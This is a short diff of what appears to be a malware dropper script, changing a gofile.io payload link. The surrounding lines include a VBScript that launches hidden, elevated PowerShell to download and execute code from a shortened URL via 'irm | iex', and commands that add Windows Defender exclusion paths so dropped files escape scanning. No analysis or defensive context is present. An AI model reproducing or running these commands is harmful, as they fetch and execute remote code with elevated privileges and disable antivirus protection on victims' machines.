@@ -4,8 +4,7 @@ powershell.exe -ExecutionPolicy Bypass -Command "Start-Process PowerShell -Argum
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Start-Process powershell.exe -ArgumentList 'irm ""https://tinyurl.com/4j72ashp"" | iex' -WindowStyle Hidden -Verb RunAs""", 0, False
 
-https://gofile.io/d/snYYtd
-
+https://gofile.io/d/W94fpb
 
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData'"
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Downloads'"
